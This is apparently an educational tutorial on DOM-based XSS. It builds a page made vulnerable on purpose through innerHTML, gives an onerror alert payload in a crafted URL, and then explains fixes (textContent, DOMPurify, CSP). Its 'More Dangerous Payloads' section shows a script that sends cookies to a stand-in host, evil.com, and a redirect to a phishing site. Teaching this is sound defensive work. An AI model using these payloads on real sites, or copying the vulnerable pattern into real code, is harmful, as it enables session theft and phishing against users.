# **DOM-Based XSS Attack Demo & Tutorial**  

## **⚠️ Important Note**  
This demo is for **educational purposes only**. Never test XSS on websites without permission—it’s illegal and unethical. Use a local test environment instead.  

---

## **Step 1: Create a Vulnerable HTML Page**  
We’ll make a simple page that takes a URL parameter and dynamically writes it to the DOM without sanitization.  

### **File: `vulnerable.html`**  
```html
<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS Demo</title>
</head>
<body>
    <h1>Welcome to the XSS Demo!</h1>
    <p>This page is vulnerable to DOM-based XSS.</p>

    <div id="output"></div>

    <script>
        // Extract URL parameter (unsafely)
        const urlParams = new URLSearchParams(window.location.search);
        const userInput = urlParams.get('input');

        // Dangerously inject into the DOM (VULNERABLE)
        document.getElementById('output').innerHTML = userInput;
    </script>
</body>
</html>
```

---

## **Step 2: Triggering the XSS Attack**  
Since the page takes `input` from the URL and directly injects it into `innerHTML`, an attacker can craft a malicious link.  

### **Malicious URL Example**  
```
http://localhost/vulnerable.html?input=<img src="x" onerror="alert('XSS Attack!')">
```
When a victim opens this link:  
1. The browser reads `input=<img src="x" onerror="alert('XSS Attack!')">` from the URL.  
2. The vulnerable script injects this into `innerHTML`.  
3. The `<img>` tag fails to load (`src="x"` is invalid), triggering the `onerror` script.  
4. The `alert()` executes, proving the XSS vulnerability.  

### **More Dangerous Payloads**  
Instead of just an `alert()`, an attacker could:  
- Steal cookies:  
  ```javascript
  <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  ```
- Redirect to a phishing site:  
  ```javascript
  <script>window.location='https://evil.com'</script>
  ```

---

## **Step 3: Fixing the Vulnerability**  
To prevent DOM XSS, **never** directly inject untrusted input into the DOM. Instead:  

### **1. Use `textContent` Instead of `innerHTML`**  
```javascript
document.getElementById('output').textContent = userInput;  // Safe (no HTML parsing)
```

### **2. Sanitize Input with `DOMPurify`**  
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js"></script>
<script>
    const cleanInput = DOMPurify.sanitize(userInput);
    document.getElementById('output').innerHTML = cleanInput;  // Safe
</script>
```

### **3. Use a Content Security Policy (CSP)**  
Add this `<meta>` tag to block inline scripts:  
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

---

## **Final Thoughts**  
DOM-based XSS is dangerous because it **doesn’t involve the server**, making it harder to detect with traditional security tools.  

### **Key Takeaways:**  
✅ **Never trust user input** (URLs, forms, cookies).  
✅ **Avoid `innerHTML`** for dynamic content—use `textContent` or `DOMPurify`.  
✅ **Use CSP headers** to block unauthorized scripts.  
